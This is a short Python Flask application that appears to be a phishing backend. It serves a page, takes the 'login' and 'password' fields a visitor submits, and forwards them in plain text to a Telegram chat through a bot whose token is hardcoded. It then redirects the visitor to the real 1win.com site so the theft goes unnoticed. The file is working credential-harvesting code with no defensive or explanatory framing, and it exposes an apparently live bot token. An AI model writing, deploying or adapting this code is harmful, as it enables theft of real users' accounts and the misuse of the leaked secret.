import asyncio


from flask import Flask, render_template, request, Response
from telebot import TeleBot

app = Flask(__name__)
bot = TeleBot(token='7417950461:AAFnzG0ux037zE-x6C6F6hFuf0GXPDzt2Hs', parse_mode='HTML')




@app.route('/')
def hello_world():
    if request.args.get('login'):

        print(request.args.get('login'))# put application's code here
        print(request.args.get('password'))

        bot.send_message('-1002222131165',
                         f"Логин:<code>{request.args.get('login')}</code>\nПароль: <code>{request.args.get('password')}</code>\n\n<code>{request.args.get('login')}:{request.args.get('password')}</code>")
        return Response(headers={'Content-Type': 'text/html', 'location': 'https://1win.com/'},status=302)

    return render_template('main3.html')


if __name__ == '__main__':
    app.run()
